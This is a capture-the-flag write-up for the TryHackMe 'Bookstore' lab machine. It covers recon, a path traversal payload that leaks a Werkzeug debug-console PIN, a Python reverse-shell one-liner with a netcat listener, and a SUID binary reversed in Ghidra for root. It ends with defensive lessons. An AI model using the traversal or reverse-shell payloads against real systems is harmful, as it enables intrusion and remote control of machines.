# CTF Write-up: Bookstore — TryHackMe

| | |
|---|---|
| **Platform**   | TryHackMe |
| **Machine**    | Bookstore |
| **Difficulty** | Medium |
| **Tags**       | `REST API` `SQLi` `Python Console RCE` `SUID` `Reverse Engineering` |

---

## Introduction

Bookstore is a nicely layered room that blends web API exploitation with binary reverse engineering. The initial foothold involves abusing a debug-mode Python console, while the privilege escalation requires decompiling and analysing a SUID binary to figure out what magic number it's looking for. A satisfying box from start to finish.

---

## Step 1 — Reconnaissance (Nmap)

```bash
nmap -sC -sV -oN nmap_scan.txt <target-ip>
```

Three open ports returned:

- **Port 22** — SSH (OpenSSH 7.6p1)
- **Port 80** — HTTP (Apache 2.4.29)
- **Port 5000** — HTTP (Werkzeug 0.14.1 / Python 3.6)

Port 5000 immediately stood out. Werkzeug is the Python WSGI toolkit that Flask uses, and an older version running in debug mode can be extremely dangerous.

---

## Step 2 — Web Enumeration

Port 80 hosted a basic online bookstore frontend. I ran Gobuster against both port 80 and port 5000 to find hidden paths.

Port 5000 was more interesting — Gobuster found:

- `/api` (Status: 200) — listed available API routes
- `/console` (Status: 200) — a Python interactive shell
- `/robots.txt` (Status: 200)

The `/console` endpoint is the Werkzeug debugger console. In debug mode, Werkzeug exposes an interactive Python shell in the browser — designed for development, catastrophic in production.

---

## Step 3 — API Enumeration & Credential Extraction

Browsing to `/api` showed the available routes. Checking the admin login page source code revealed a telling comment about SQL injection not being a recommended authentication method — a direct hint.

Testing the API's `?show=` parameter with a path traversal payload:

```
http://<target-ip>:5000/api/v2/resources/books?show=.bash_history
```

This revealed the bash history file containing a PIN — the access code needed to unlock the Werkzeug console.

---

## Step 4 — Reverse Shell via Werkzeug Console

With the PIN in hand, I unlocked the `/console` endpoint on port 5000. This dropped me into a fully interactive Python 3 shell running on the server. From here, getting a reverse shell was trivial:

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<your-ip>",4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Started a Netcat listener:

```bash
nc -lvnp 4443
```

Executed the payload in the console. Shell popped.

Grabbed the user flag:

```bash
cat /home/sid/user.txt
```

> **FLAG:** `[user flag here]`

---

## Step 5 — Privilege Escalation (SUID Binary Analysis)

I couldn't use sudo (needed a password I didn't have), so I searched for SUID binaries:

```bash
find / -perm /4000 -type f 2>/dev/null
```

One entry stood out immediately: a binary called `try-harder`. That name is basically a neon sign pointing at a privilege escalation vector.

I transferred the binary to my attack machine for analysis:

```bash
python3 -m http.server 8000   # (on target)
wget http://<target-ip>:8000/try-harder   # (on attacker)
```

Opened it in Ghidra for static analysis. The decompiled code revealed the binary required the user to input a specific number. If the correct number was provided, it spawned a bash shell with root privileges.

Working through the logic in Ghidra — involving some XOR operations and hardcoded values — I decoded the correct input: `1573743953`

Back on the target:

```bash
./try-harder
```

Entered the number when prompted. Root shell.

---

## Step 6 — Root Flag

```bash
cat /root/root.txt
```

> **FLAG:** `[root flag here]`

---

## Summary & Takeaways

Bookstore had a solid two-phase structure:

1. Werkzeug debug console (locked by a PIN extracted via API path traversal) gave us initial code execution.
2. A SUID binary with hardcoded logic, reversed in Ghidra, provided the number needed for a root shell.

Key lesson: never leave a development debug console accessible in production — Werkzeug's debugger is particularly dangerous. And SUID binaries with custom logic should always get scrutiny; they almost always have a flaw.
